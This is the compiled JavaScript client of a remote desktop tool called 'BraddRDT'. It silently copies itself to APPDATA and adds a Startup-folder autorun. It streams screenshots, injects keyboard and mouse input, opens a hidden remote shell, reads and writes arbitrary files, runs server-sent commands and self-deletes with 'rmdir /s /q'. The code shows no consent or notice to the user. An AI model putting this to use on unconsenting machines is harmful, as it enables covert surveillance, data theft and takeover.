"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const socket_io_client_1 = require("socket.io-client");
// @ts-ignore
const screenshot_desktop_1 = __importDefault(require("screenshot-desktop"));
const systeminformation_1 = __importDefault(require("systeminformation"));
const child_process_1 = require("child_process");
const path_1 = __importDefault(require("path"));
const fs_1 = __importDefault(require("fs"));
const os_1 = __importDefault(require("os"));
const werift_1 = require("werift");
// Config
const SERVER_URL = process.env.SERVER_URL || 'http://localhost:5000';
const CUSTOM_NAME = ''; // Will be replaced by builder
const CONFIG_FILE = path_1.default.join(os_1.default.homedir(), '.bradd-rdt-client-id');
console.log(`Client starting... Connecting to ${SERVER_URL}`);
// Get or Create Client ID
let clientId = '';
if (fs_1.default.existsSync(CONFIG_FILE)) {
    clientId = fs_1.default.readFileSync(CONFIG_FILE, 'utf-8').trim();
}
else {
    clientId = require('crypto').randomUUID();
    fs_1.default.writeFileSync(CONFIG_FILE, clientId);
}
console.log(`Client ID: ${clientId}`);
const socket = (0, socket_io_client_1.io)(SERVER_URL);
let streamInterval = null;
// Helper function to extract and get helper path
function getInputHelperPath() {
    // Check if running in pkg
    // @ts-ignore
    if (process.pkg) {
        try {
            // In pkg, __dirname points to /snapshot/project/dist (since main is dist/index.js)
            // We ensure InputHelper.exe is copied to dist/ during build
            const internalPath = path_1.default.join(__dirname, 'InputHelper.exe');
            // Use a unique temp path to avoid locking issues if multiple instances run (e.g. installer + installed)
            // We use the PID to ensure uniqueness for this process
            const tempPath = path_1.default.join(os_1.default.tmpdir(), `bradd-rdt-input-helper-${process.pid}.exe`);
            // Extract the embedded exe
            fs_1.default.writeFileSync(tempPath, fs_1.default.readFileSync(internalPath));
            // Clean up on exit
            // Note: This might not run on forceful kill, but tmp is cleared eventually by OS
            const cleanup = () => {
                try {
                    if (fs_1.default.existsSync(tempPath))
                        fs_1.default.unlinkSync(tempPath);
                }
                catch (e) { }
            };
            process.on('exit', cleanup);
            process.on('SIGINT', () => { cleanup(); process.exit(); });
            process.on('SIGTERM', () => { cleanup(); process.exit(); });
            return tempPath;
        }
        catch (e) {
            console.error('Failed to extract InputHelper:', e);
            // Fallback: try the generic name if extraction failed (maybe already there?)
            const fallbackPath = path_1.default.join(os_1.default.tmpdir(), 'bradd-rdt-input-helper.exe');
            if (fs_1.default.existsSync(fallbackPath))
                return fallbackPath;
        }
    }
    // Dev / Normal node execution
    let devPath = path_1.default.join(__dirname, 'InputHelper.exe'); // src/InputHelper.exe
    if (fs_1.default.existsSync(devPath))
        return devPath;
    devPath = path_1.default.join(process.cwd(), 'InputHelper.exe');
    if (fs_1.default.existsSync(devPath))
        return devPath;
    return 'InputHelper.exe';
}
// Self-Install Logic
function checkAndInstall() {
    // @ts-ignore
    if (!process.pkg)
        return; // Only for packaged exe
    const installDir = path_1.default.join(process.env.APPDATA || os_1.default.homedir(), 'BraddRDT');
    const exeName = 'BraddRDT.exe';
    const installedPath = path_1.default.join(installDir, exeName);
    // If we are NOT running from the install directory
    if (path_1.default.dirname(process.execPath).toLowerCase() !== installDir.toLowerCase()) {
        console.log('Running from temporary location. Installing to:', installDir);
        try {
            if (!fs_1.default.existsSync(installDir)) {
                fs_1.default.mkdirSync(installDir, { recursive: true });
            }
            // Copy self to install dir
            fs_1.default.copyFileSync(process.execPath, installedPath);
            console.log('Installation successful. Relaunching from install dir...');
            // Spawn the installed executable
            const child = (0, child_process_1.spawn)(installedPath, [], {
                detached: true,
                stdio: 'ignore'
            });
            child.unref();
            // Exit this process (the installer)
            process.exit(0);
        }
        catch (e) {
            console.error('Installation failed:', e);
            // If install fails, continue running? Or exit?
            // Continue running allows troubleshooting or portable use if permission denied.
        }
    }
}
let inputHelperPath = getInputHelperPath();
console.log(`Input Helper Path: ${inputHelperPath}`);
// Run install check immediately
checkAndInstall();
// Persistent InputHelper Process
let inputProcess = null;
function ensureInputProcess() {
    var _a, _b, _c;
    if (!inputProcess || inputProcess.killed) {
        try {
            console.log('Spawning persistent InputHelper process...');
            // @ts-ignore
            inputProcess = (0, child_process_1.spawn)(inputHelperPath, [], {
                stdio: ['pipe', 'pipe', 'pipe'], // Don't inherit to avoid console window issues
                windowsHide: true // Hide the window
            });
            inputProcess.on('error', (err) => {
                console.error('InputHelper process error:', err);
                inputProcess = null;
            });
            (_a = inputProcess.stdin) === null || _a === void 0 ? void 0 : _a.on('error', (err) => {
                console.error('InputHelper stdin error:', err);
                if (inputProcess)
                    inputProcess.kill();
                inputProcess = null;
            });
            // Consume streams to prevent buffering/hanging
            (_b = inputProcess.stdout) === null || _b === void 0 ? void 0 : _b.on('data', (data) => {
                const str = data.toString().trim();
                if (str && str !== 'pong')
                    console.log('InputHelper:', str);
            });
            (_c = inputProcess.stderr) === null || _c === void 0 ? void 0 : _c.on('data', (data) => {
                console.error('InputHelper stderr:', data.toString());
            });
            inputProcess.on('exit', (code) => {
                console.warn('InputHelper process exited with code:', code);
                inputProcess = null;
            });
        }
        catch (e) {
            console.error('Failed to spawn InputHelper:', e);
        }
    }
}
// Ensure process starts
ensureInputProcess();
let screenWidth = 1920;
let screenHeight = 1080;
function setupAutorun() {
    // Only for Windows
    if (process.platform === 'win32') {
        const keyName = 'BraddRDTClient';
        let targetPath = '';
        // @ts-ignore
        if (process.pkg) {
            targetPath = process.execPath;
        }
        else {
            // Dev mode: Create a .bat file to launch the client
            const batPath = path_1.default.join(process.cwd(), 'start_client.bat');
            const batContent = `@echo off
cd /d "${process.cwd()}"
npm start
`;
            try {
                fs_1.default.writeFileSync(batPath, batContent);
                targetPath = batPath;
            }
            catch (e) {
                console.error('Failed to create autorun batch file:', e);
                return;
            }
        }
        if (targetPath) {
            console.log('Configuring autorun for:', targetPath);
            // Use Startup Folder instead of Registry for better reliability
            const startupFolder = path_1.default.join(os_1.default.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
            const shortcutPath = path_1.default.join(startupFolder, 'BraddRDTClient.bat'); // Use .bat for simplicity, or just copy the bat there
            try {
                // For dev mode, we can just write the bat content directly to startup folder
                // For prod mode (exe), we should create a shortcut, but writing a bat that launches exe is easier
                const launchScript = `@echo off
start "" "${targetPath}"
`;
                fs_1.default.writeFileSync(shortcutPath, launchScript);
                console.log('Autorun configured in Startup folder:', shortcutPath);
            }
            catch (e) {
                console.error('Failed to setup autorun in Startup folder:', e);
            }
        }
    }
}
async function main() {
    let hostname = 'Unknown';
    let platform = 'Unknown';
    try {
        const osInfo = await systeminformation_1.default.osInfo();
        hostname = CUSTOM_NAME || osInfo.hostname;
        platform = osInfo.platform;
        const graphics = await systeminformation_1.default.graphics();
        if (graphics.displays.length > 0) {
            screenWidth = graphics.displays[0].currentResX || 1920;
            screenHeight = graphics.displays[0].currentResY || 1080;
            console.log(`Screen Resolution: ${screenWidth}x${screenHeight}`);
        }
    }
    catch (e) {
        console.error("Error getting system info", e);
        hostname = CUSTOM_NAME || require('os').hostname();
        platform = require('os').platform();
    }
    console.log(`Identifying as ${hostname} (${platform})`);
    setupAutorun();
    if (socket.connected) {
        register();
    }
    socket.on('connect', () => {
        console.log('Connected to server ID:', socket.id);
        register();
    });
    socket.on('connect_error', (err) => {
        console.error('Connection error:', err.message);
    });
    function register() {
        socket.emit('register-client', {
            id: clientId,
            hostname: hostname,
            platform: platform
        });
    }
    const peers = new Map();
    const dcs = new Map(); // DataChannels
    let isCapturing = false;
    // Shared Capture Loop
    const startCaptureLoop = () => {
        if (isCapturing)
            return;
        isCapturing = true;
        const loop = async () => {
            if (peers.size === 0) {
                isCapturing = false;
                return;
            }
            try {
                // Only capture if at least one DC needs data
                let needsFrame = false;
                for (const [id, dc] of dcs) {
                    if (dc.readyState === 'open' && dc.bufferedAmount < 1024 * 64) {
                        needsFrame = true;
                        break;
                    }
                }
                if (needsFrame) {
                    const img = await (0, screenshot_desktop_1.default)({ format: 'jpg', quality: 75 });
                    for (const [id, dc] of dcs) {
                        if (dc.readyState === 'open' && dc.bufferedAmount < 1024 * 64) {
                            try {
                                dc.send(img);
                            }
                            catch (e) { }
                        }
                    }
                }
            }
            catch (e) {
                console.error('Capture error:', e);
            }
            if (peers.size > 0) {
                setTimeout(loop, 20); // ~50 FPS target
            }
            else {
                isCapturing = false;
            }
        };
        loop();
    };
    socket.on('start-stream', async (data) => {
        var _a;
        const { requester } = data;
        console.log('Starting WebRTC stream for', requester);
        if (peers.has(requester)) {
            try {
                (_a = peers.get(requester)) === null || _a === void 0 ? void 0 : _a.close();
            }
            catch (e) { }
            peers.delete(requester);
            dcs.delete(requester);
        }
        const pc = new werift_1.RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        peers.set(requester, pc);
        const dc = pc.createDataChannel('screen');
        // werift DataChannel doesn't have standard onopen property sometimes? 
        // using stateChanged as in previous code
        dc.stateChanged.subscribe((state) => {
            if (state === 'open') {
                dcs.set(requester, dc);
                startCaptureLoop();
            }
            else if (state === 'closed') {
                dcs.delete(requester);
            }
        });
        pc.iceConnectionStateChange.subscribe((state) => {
            var _a;
            console.log(`ICE State (${requester}):`, state);
            if (state === 'disconnected' || state === 'failed' || state === 'closed') {
                (_a = peers.get(requester)) === null || _a === void 0 ? void 0 : _a.close();
                peers.delete(requester);
                dcs.delete(requester);
            }
        });
        pc.onIceCandidate.subscribe((candidate) => {
            if (candidate) {
                socket.emit('ice-candidate', { target: requester, candidate });
            }
        });
        // Create Offer
        try {
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            socket.emit('offer', { target: requester, sdp: offer });
        }
        catch (e) {
            console.error('Error creating offer:', e);
            peers.delete(requester);
        }
    });
    socket.on('answer', async (data) => {
        const pc = peers.get(data.source);
        if (pc) {
            try {
                await pc.setRemoteDescription(data.sdp);
            }
            catch (e) {
                console.error('Error setting remote description:', e);
            }
        }
    });
    socket.on('ice-candidate', async (data) => {
        const pc = peers.get(data.source);
        if (pc) {
            try {
                await pc.addIceCandidate(data.candidate);
            }
            catch (e) {
                console.error('Error adding candidate:', e);
            }
        }
    });
    socket.on('stop-stream', (data) => {
        // If specific requester sent stop
        if (data && data.requester) {
            const pc = peers.get(data.requester);
            if (pc) {
                pc.close();
                peers.delete(data.requester);
                dcs.delete(data.requester);
            }
        }
        else {
            // Stop all? Or just ignore? 
            // Previous behavior stopped all. Let's keep it safe.
            // But if one admin leaves, we don't want to stop others.
            // The server usually doesn't emit stop-stream broadcast.
        }
    });
    socket.on('input', (data) => {
        const now = Date.now();
        console.log(`[${now}] Input received: ${data.type}`);
        handleInput(data);
    });
    // Handle remote commands
    // Persistent Shell Session
    let shellProcess = null;
    socket.on('start-term', async () => {
        var _a, _b;
        if (shellProcess)
            return;
        console.log('Starting terminal session...');
        // Check admin
        const checkAdmin = () => new Promise(resolve => {
            if (process.platform !== 'win32')
                return resolve(false);
            (0, child_process_1.exec)('net session', (err) => {
                resolve(!err);
            });
        });
        const isAdmin = await checkAdmin();
        const statusMsg = isAdmin
            ? '\r\n\x1b[32m[Running as Administrator]\x1b[0m\r\n'
            : '\r\n\x1b[33m[Running as User - Restart client as Admin for full privileges]\x1b[0m\r\n';
        socket.emit('term-data', statusMsg);
        if (process.platform === 'win32') {
            // Use cmd.exe wrapping powershell or just powershell with windowsHide
            shellProcess = (0, child_process_1.spawn)('powershell.exe', ['-NoLogo'], {
                shell: false,
                windowsHide: true
            });
        }
        else {
            shellProcess = (0, child_process_1.spawn)('bash', ['-i'], {
                shell: false,
                windowsHide: true
            });
        }
        if (shellProcess.stdin) {
            shellProcess.stdin.setDefaultEncoding('utf-8');
        }
        (_a = shellProcess.stdout) === null || _a === void 0 ? void 0 : _a.on('data', (data) => {
            socket.emit('term-data', data.toString());
        });
        (_b = shellProcess.stderr) === null || _b === void 0 ? void 0 : _b.on('data', (data) => {
            socket.emit('term-data', data.toString());
        });
        shellProcess.on('exit', () => {
            shellProcess = null;
            socket.emit('term-data', '\r\nShell exited.\r\n');
        });
    });
    socket.on('term-input', (data) => {
        // console.log('Term input received:', JSON.stringify(data));
        if (shellProcess && shellProcess.stdin) {
            try {
                let inputToWrite = data;
                // Backspace mapping (DEL -> BS)
                if (inputToWrite === '\x7f') {
                    inputToWrite = '\x08';
                }
                // Enter mapping (CR -> CR LF)
                if (inputToWrite === '\r') {
                    inputToWrite = '\r\n';
                }
                shellProcess.stdin.write(inputToWrite);
                // Manual Echo for Windows (since pipes usually don't echo)
                if (process.platform === 'win32') {
                    // If backspace, we simulate backspace echo
                    if (inputToWrite === '\x08') {
                        // Send Backspace - Space - Backspace to erase character visually
                        socket.emit('term-data', '\b \b');
                    }
                    else if (inputToWrite === '\r\n') {
                        // Echo newline
                        socket.emit('term-data', '\r\n');
                    }
                    else {
                        // Echo normal character (Space, letters, etc.)
                        // Check if it's a printable character or simple control code
                        socket.emit('term-data', inputToWrite);
                    }
                }
            }
            catch (e) {
                console.error('Write to shell failed:', e);
            }
        }
        else {
            console.warn('Shell not ready or stdin closed');
        }
    });
    socket.on('get-sys-info', async (data) => {
        const { requester } = data;
        try {
            const cpu = await systeminformation_1.default.cpu();
            const mem = await systeminformation_1.default.mem();
            const osInfo = await systeminformation_1.default.osInfo();
            const disk = await systeminformation_1.default.fsSize();
            socket.emit('sys-info', { target: requester, data: { cpu, mem, osInfo, disk } });
        }
        catch (e) {
            console.error('Error getting sys info:', e);
        }
    });
    socket.on('fs-list', async (data) => {
        const { requester, path: dirPath } = data;
        const targetPath = dirPath || (os_1.default.platform() === 'win32' ? 'C:\\' : '/');
        try {
            const items = fs_1.default.readdirSync(targetPath, { withFileTypes: true });
            const files = items.map(f => {
                let size = 0;
                if (!f.isDirectory()) {
                    try {
                        size = fs_1.default.statSync(path_1.default.join(targetPath, f.name)).size;
                    }
                    catch (e) { }
                }
                return {
                    name: f.name,
                    isDirectory: f.isDirectory(),
                    size: size
                };
            });
            socket.emit('fs-list-result', { target: requester, path: targetPath, files });
        }
        catch (e) {
            socket.emit('fs-error', { target: requester, error: e.message });
        }
    });
    socket.on('fs-read', (data) => {
        const { requester, path: filePath } = data;
        try {
            const content = fs_1.default.readFileSync(filePath);
            socket.emit('fs-file', { target: requester, name: path_1.default.basename(filePath), data: content });
        }
        catch (e) {
            socket.emit('fs-error', { target: requester, error: e.message });
        }
    });
    socket.on('fs-write', (data) => {
        const { path: filePath, data: content } = data;
        try {
            fs_1.default.writeFileSync(filePath, content);
        }
        catch (e) {
            console.error('File write error:', e);
        }
    });
    socket.on('term-resize', (size) => {
        // Standard spawn doesn't support resize, ignoring for now.
        // Ideally use node-pty for resize support.
    });
    socket.on('command', (data) => {
        console.log('Received command:', data.command);
        if (data.command === 'uninstall') {
            console.log('Uninstalling client...');
            // Kill child processes
            if (inputProcess)
                inputProcess.kill();
            if (shellProcess)
                shellProcess.kill();
            // Remove Autorun (Registry - Legacy)
            if (process.platform === 'win32') {
                (0, child_process_1.exec)('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "BraddRDTClient" /f', () => { });
            }
            // Remove Autorun (Startup Folder)
            try {
                const startupFolder = path_1.default.join(os_1.default.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
                const shortcutPath = path_1.default.join(startupFolder, 'BraddRDTClient.bat');
                if (fs_1.default.existsSync(shortcutPath)) {
                    fs_1.default.unlinkSync(shortcutPath);
                }
            }
            catch (e) {
                console.error('Failed to remove startup shortcut:', e);
            }
            // Delete Config
            try {
                if (fs_1.default.existsSync(CONFIG_FILE)) {
                    fs_1.default.unlinkSync(CONFIG_FILE);
                }
            }
            catch (e) {
                console.error('Failed to delete config:', e);
            }
            // Self-delete (Only if packaged)
            // @ts-ignore
            if (process.pkg) {
                const scriptPath = path_1.default.join(os_1.default.tmpdir(), 'cleanup.bat');
                const exePath = process.execPath;
                const installDir = path_1.default.dirname(exePath);
                // If we are in the install dir, try to remove the whole dir
                let cleanupCmd = `del "${exePath}"`;
                if (path_1.default.basename(installDir) === 'BraddRDT') {
                    // We try to remove the directory. 
                    // Note: cmd cannot delete the directory while a file inside (exe) is running.
                    // So we wait, del exe, then rd dir.
                    cleanupCmd = `
del "${exePath}"
cd ..
rmdir /s /q "${installDir}"
`;
                }
                const scriptContent = `
@echo off
timeout /t 3 /nobreak > NUL
${cleanupCmd}
del "%~f0"
`;
                fs_1.default.writeFileSync(scriptPath, scriptContent);
                (0, child_process_1.spawn)('cmd.exe', ['/c', scriptPath], { detached: true, stdio: 'ignore' });
            }
            setTimeout(() => process.exit(0), 500);
        }
        else {
            // Shell command
            const child = (0, child_process_1.spawn)(data.command, data.args || [], { shell: true });
            child.stdout.on('data', (chunk) => {
                socket.emit('command-result', { target: data.source, output: chunk.toString() });
            });
            child.stderr.on('data', (chunk) => {
                socket.emit('command-result', { target: data.source, output: chunk.toString() });
            });
        }
    });
    socket.on('disconnect', () => {
        console.log('Disconnected from server');
        if (streamInterval)
            clearInterval(streamInterval);
    });
    process.on('uncaughtException', (err) => {
        console.error('Uncaught Exception:', err);
    });
    process.on('unhandledRejection', (reason, promise) => {
        console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    });
    // Keep process alive
    setInterval(() => { }, 60000);
    /*
       Removed proactive ping check to avoid potential pipe issues or race conditions during idle.
       We already handle write errors in handleInput() by respawning the process.
    */
}
function handleInput(data) {
    // data: { type: 'move'|'click'|'type'|'scroll', x, y, button, text, amount }
    let args = [];
    if (data.type === 'move') {
        let x = data.x;
        let y = data.y;
        // If normalized (0-1), scale to screen size
        // We assume if x is small (< 2) it's normalized, unless it's exactly 0 or 1 pixel which is rare/edge
        // Better: frontend should just always send normalized? 
        // Let's support both.
        if (x <= 1 && y <= 1) {
            x = Math.round(x * screenWidth);
            y = Math.round(y * screenHeight);
        }
        else {
            x = Math.round(x);
            y = Math.round(y);
        }
        args = ['move', x.toString(), y.toString()];
    }
    else if (data.type === 'mousedown') {
        args = ['mousedown', data.button || 'left'];
    }
    else if (data.type === 'mouseup') {
        args = ['mouseup', data.button || 'left'];
    }
    else if (data.type === 'click') {
        if (data.x !== undefined && data.y !== undefined) {
            let x = data.x;
            let y = data.y;
            if (x <= 1 && y <= 1) {
                x = Math.round(x * screenWidth);
                y = Math.round(y * screenHeight);
            }
            else {
                x = Math.round(x);
                y = Math.round(y);
            }
            args = ['click_at', x.toString(), y.toString(), data.button || 'left'];
        }
        else {
            args = ['click', data.button || 'left'];
        }
    }
    else if (data.type === 'scroll') {
        args = ['scroll', (data.amount || 0).toString()];
    }
    else if (data.type === 'type') {
        args = ['type', data.text];
    }
    else if (data.type === 'keydown') {
        args = ['keydown', data.keyCode.toString()];
    }
    else if (data.type === 'keyup') {
        args = ['keyup', data.keyCode.toString()];
    }
    if (args.length > 0) {
        ensureInputProcess();
        if (inputProcess && inputProcess.stdin) {
            const commandLine = args.join(' ') + '\r\n';
            // console.log('Sending to InputHelper:', commandLine.trim());
            try {
                inputProcess.stdin.write(commandLine);
            }
            catch (e) {
                console.error('Error writing to InputHelper stdin:', e);
                inputProcess.kill();
                inputProcess = null;
            }
        }
    }
}
main();
